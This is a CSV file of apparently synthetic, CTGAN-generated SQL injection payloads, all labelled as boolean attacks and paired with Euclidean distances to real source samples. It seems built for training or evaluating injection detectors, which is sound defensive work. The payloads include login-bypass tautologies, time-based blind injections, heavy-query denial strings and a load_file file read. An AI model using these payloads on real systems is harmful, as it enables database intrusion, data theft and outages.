id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000068,attack,boolean," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",nearest_attack_euclidean,R000014,6.330591666957452
CTGAN_000069,attack,boolean,admin'  )   or   (  '1'  =  '1'#,nearest_attack_euclidean,R000224,7.678733793843272
CTGAN_000070,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000193,4.17737021811668
CTGAN_000071,attack,boolean,select * from users where id  =  1 +$+ or 1  =  1 -- 1,nearest_attack_euclidean,R000001,5.9066232065309
CTGAN_000072,attack,boolean,admin'  )   or '1'  =  '1'--,nearest_attack_euclidean,R000082,7.950312228190653
CTGAN_000073,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,4.347465858787485
CTGAN_000074,attack,boolean,select * from users where id  =  1 +$+ or 1  =  1 -- 1,nearest_attack_euclidean,R000001,6.485983315283904
CTGAN_000075,attack,boolean," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",nearest_attack_euclidean,R000095,6.873539254368056
CTGAN_000076,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,2.306690511652368
CTGAN_000077,attack,boolean," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",nearest_attack_euclidean,R000036,5.7296495180549725
CTGAN_000078,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,7.720372432678579
CTGAN_000079,attack,boolean,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',nearest_attack_euclidean,R000021,8.83982961023657
CTGAN_000080,attack,boolean," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000130,6.112991927463978
CTGAN_000081,attack,boolean,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,nearest_attack_euclidean,R000009,7.431644280796861
CTGAN_000082,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000073,6.279385296904872
CTGAN_000083,attack,boolean,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,nearest_attack_euclidean,R000205,7.271323951779062
CTGAN_000084,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000103,9.536373929106382
CTGAN_000085,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000064,6.414292073881893
CTGAN_000086,attack,boolean,-7999  )   or 8422  =  1336,nearest_attack_euclidean,R000293,6.517907615098362
CTGAN_000087,attack,boolean,select * from users where id  =  1 +$+ or 1  =  1 -- 1,nearest_attack_euclidean,R000001,10.167614088962202
CTGAN_000088,attack,boolean,select * from users where id  =  1 <@1$ or 1  =  1 -- 1,nearest_attack_euclidean,R000273,6.271662128859942
CTGAN_000089,attack,boolean,"admin"" or ""1""  =  ""1""--",nearest_attack_euclidean,R000010,5.537959948309307
CTGAN_000090,attack,boolean,select * from users where id  =  1 %$ . or 1  =  1 -- 1,nearest_attack_euclidean,R000243,3.9977085173772
CTGAN_000091,attack,boolean,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,nearest_attack_euclidean,R000107,5.720535400728014
CTGAN_000092,attack,boolean,"admin""  )   or ""1""  =  ""1""--",nearest_attack_euclidean,R000244,6.139811976085756
CTGAN_000093,attack,boolean," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000152,11.277875574837488
CTGAN_000094,attack,boolean,select * from users where id  =  1 %$ . or 1  =  1 -- 1,nearest_attack_euclidean,R000243,10.313268897282999
CTGAN_000095,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,4.740057253108804
CTGAN_000096,attack,boolean,"1'  )   where 6941  =  6941 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000280,12.114825006415426
CTGAN_000097,attack,boolean,"admin""  )   or ""1""  =  ""1""--",nearest_attack_euclidean,R000244,5.281890152310643
CTGAN_000098,attack,boolean,select * from users where id  =  1   or 1  =  1 -- 1,nearest_attack_euclidean,R000046,4.064390860586801
CTGAN_000099,attack,boolean,%27 or 1  =  1,nearest_attack_euclidean,R000019,6.9757067148334855
CTGAN_000100,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,7.244489218469711
CTGAN_000101,attack,boolean,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000118,10.77368966049864
CTGAN_000102,attack,boolean,select * from users where id  =  1   or 1  =  1 -- 1,nearest_attack_euclidean,R000046,6.512482109625724
CTGAN_000103,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000064,8.123851564007165
CTGAN_000104,attack,boolean,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,nearest_attack_euclidean,R000178,6.385926128366671
CTGAN_000105,attack,boolean,"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000285,9.63541266421995
CTGAN_000106,attack,boolean," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",nearest_attack_euclidean,R000051,8.691297579632645
CTGAN_000107,attack,boolean,%27 or 1  =  1,nearest_attack_euclidean,R000019,10.827503415543523
CTGAN_000108,attack,boolean,select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000247,4.695226374417453
CTGAN_000109,attack,boolean,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',nearest_attack_euclidean,R000212,7.597537996485443
CTGAN_000110,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000092,7.57986255199337
CTGAN_000111,attack,boolean," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",nearest_attack_euclidean,R000023,3.6575878877875594
CTGAN_000112,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,4.60294626766123
CTGAN_000113,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,7.35001432703941
CTGAN_000114,attack,boolean," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000181,3.2047023741781473
CTGAN_000115,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000076,4.824232216379854
CTGAN_000116,attack,boolean,? or 1  =  1 --,nearest_attack_euclidean,R000002,4.759843384317635
CTGAN_000117,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000259,5.57992712290853
CTGAN_000118,attack,boolean," end and   (  ""vwbx""  =  ""vwbx",nearest_attack_euclidean,R000311,5.288510213070447
CTGAN_000119,attack,boolean," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",nearest_attack_euclidean,R000023,4.410346549426787
CTGAN_000120,attack,boolean,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',nearest_attack_euclidean,R000085,8.536044887288556
CTGAN_000121,attack,boolean," select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000228,4.175082215710546
CTGAN_000122,attack,boolean," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000061,6.191255483147265
CTGAN_000123,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,6.885169377699448
CTGAN_000124,attack,boolean,select * from users where id  =  1.*1 or 1  =  1 -- 1,nearest_attack_euclidean,R000148,7.019462886955124
CTGAN_000125,attack,boolean," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000061,6.020014542370054
CTGAN_000126,attack,boolean,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,nearest_attack_euclidean,R000178,7.33698616534877
CTGAN_000127,attack,boolean,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',nearest_attack_euclidean,R000100,10.624670827739358
CTGAN_000128,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,4.308272273193303
CTGAN_000129,attack,boolean," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000130,7.074282090064502
CTGAN_000130,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,5.272965004089225
CTGAN_000131,attack,boolean,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000118,7.624582697527464
CTGAN_000132,attack,boolean," select * from users where id  =  1 or ""{{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000265,6.866252817685946
CTGAN_000133,attack,boolean,  )   or   (  'x'  )    =    (  'x,nearest_attack_euclidean,R000217,7.076633645820425
CTGAN_000134,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000259,5.4977763639550545
CTGAN_000135,attack,boolean," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000133,5.104579749634511
CTGAN_000136,attack,boolean,select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,nearest_attack_euclidean,R000150,6.4442915507343255
CTGAN_000137,attack,boolean," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000125,4.010720512517226
CTGAN_000138,attack,boolean,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000203,6.421079627337489
CTGAN_000139,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,4.8207700152132045
CTGAN_000140,attack,boolean," select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000187,7.125401804768153
CTGAN_000141,attack,boolean," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000011,7.559846983115197
CTGAN_000142,attack,boolean,select * from users where id  =  1 +$+. or 1  =  1 -- 1,nearest_attack_euclidean,R000043,6.596257495275496
CTGAN_000143,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000259,7.88758712387511
CTGAN_000144,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000176,7.263872179421239
CTGAN_000145,attack,boolean,select * from users where id  =  1 <@ or 1  =  1 -- 1,nearest_attack_euclidean,R000060,5.875902751200976
CTGAN_000146,attack,boolean,admin'  )   or   (  '1'  =  '1'#,nearest_attack_euclidean,R000224,5.699440211465765
CTGAN_000147,attack,boolean," select * from users where id  =  1 or ""%1"" or 1  =  1 -- 1",nearest_attack_euclidean,R000255,5.127410726896567
CTGAN_000148,attack,boolean,-7999  )   or 8422  =  1336,nearest_attack_euclidean,R000293,9.209110500051809
CTGAN_000149,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000064,6.160217403623995
CTGAN_000150,attack,boolean," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",nearest_attack_euclidean,R000098,4.881018440051126
CTGAN_000151,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000176,9.559911090429042
CTGAN_000152,attack,boolean,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',nearest_attack_euclidean,R000007,10.80753372231008
CTGAN_000153,attack,boolean," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000130,4.752654410882172
CTGAN_000154,attack,boolean,"admin""  )   or ""1""  =  ""1""/*",nearest_attack_euclidean,R000256,7.389551752161925
CTGAN_000155,attack,boolean," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",nearest_attack_euclidean,R000036,9.508290395334102
CTGAN_000156,attack,boolean," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",nearest_attack_euclidean,R000078,5.486837134587795
CTGAN_000157,attack,boolean,"hi or 1  =  1 --""",nearest_attack_euclidean,R000109,5.622581655795576
CTGAN_000158,attack,boolean," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",nearest_attack_euclidean,R000155,7.915041160623519
CTGAN_000159,attack,boolean,select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000218,5.490715683933272
CTGAN_000160,attack,boolean," select * from users where id  =  1 or ""\#"" or 1  =  1 -- 1",nearest_attack_euclidean,R000267,9.063494538479848
CTGAN_000161,attack,boolean,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,nearest_attack_euclidean,R000009,5.763976730037502
CTGAN_000162,attack,boolean,select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000247,5.87781456193252
CTGAN_000163,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000177,8.342047218722792
CTGAN_000164,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,4.092770849087279
CTGAN_000165,attack,boolean,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,nearest_attack_euclidean,R000009,9.77418547556361
CTGAN_000166,attack,boolean," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",nearest_attack_euclidean,R000039,7.756617757802068
CTGAN_000167,attack,boolean,Ã½ or 1  =  1 --,nearest_attack_euclidean,R000111,5.044964914134428
CTGAN_000168,attack,boolean," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",nearest_attack_euclidean,R000129,6.729377503118766
CTGAN_000169,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000177,6.591010756307855
CTGAN_000170,attack,boolean,"admin""  )   or ""1""  =  ""1""--",nearest_attack_euclidean,R000244,5.664616731910248
CTGAN_000171,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""/*",nearest_attack_euclidean,R000253,8.590651531427747
CTGAN_000172,attack,boolean,select * from users where id  =  1 +$+ or 1  =  1 -- 1,nearest_attack_euclidean,R000001,7.232810807917765
CTGAN_000173,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000193,6.639582227560687
CTGAN_000174,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'gmil'  =  'gmil",nearest_attack_euclidean,R000282,13.807054368844287
CTGAN_000175,attack,boolean,select * from users where id  =  1.%@ or 1  =  1 -- 1,nearest_attack_euclidean,R000160,6.702308347368478
CTGAN_000176,attack,boolean,"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000299,9.893784143606393
CTGAN_000177,attack,boolean, and 1  =  0  )   union all,nearest_attack_euclidean,R000263,5.543145019093546
CTGAN_000178,attack,boolean,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,nearest_attack_euclidean,R000009,9.999849265669448
CTGAN_000179,attack,boolean," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000058,7.74106900280768
CTGAN_000180,attack,boolean,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,nearest_attack_euclidean,R000009,10.18531933770277
CTGAN_000181,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,6.808434543351933
CTGAN_000182,attack,boolean," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000230,5.49479824386169
CTGAN_000183,attack,boolean," select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000208,7.289052834472065
CTGAN_000184,attack,boolean,admin' or 1  =  1#,nearest_attack_euclidean,R000004,4.764068066392279
CTGAN_000185,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,7.484756346021371
CTGAN_000186,attack,boolean,admin'  )   or '1'  =  '1'#,nearest_attack_euclidean,R000089,11.049438251039339
CTGAN_000187,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000164,8.77687029096801
CTGAN_000188,attack,boolean,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,nearest_attack_euclidean,R000009,7.083398683302188
CTGAN_000189,attack,boolean," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000011,8.189349974438974
CTGAN_000190,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000064,7.5011673362975335
CTGAN_000191,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000259,7.398184939035
CTGAN_000192,attack,boolean,admin'or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000175,6.527035712900843
CTGAN_000193,attack,boolean,"admin""  )   or ""1""  =  ""1""--",nearest_attack_euclidean,R000244,5.720781443745255
CTGAN_000194,attack,boolean,admin'  )   or '1'  =  '1'--,nearest_attack_euclidean,R000082,5.214260247095526
CTGAN_000195,attack,boolean," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000130,6.938579661434782
CTGAN_000196,attack,boolean," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000114,7.607103291872357
CTGAN_000197,attack,boolean,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000118,7.169007394948374
CTGAN_000198,attack,boolean,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,nearest_attack_euclidean,R000009,9.173500045985943
CTGAN_000199,attack,boolean," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000133,5.010232030798132
CTGAN_000200,attack,boolean," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",nearest_attack_euclidean,R000051,6.398798861225785
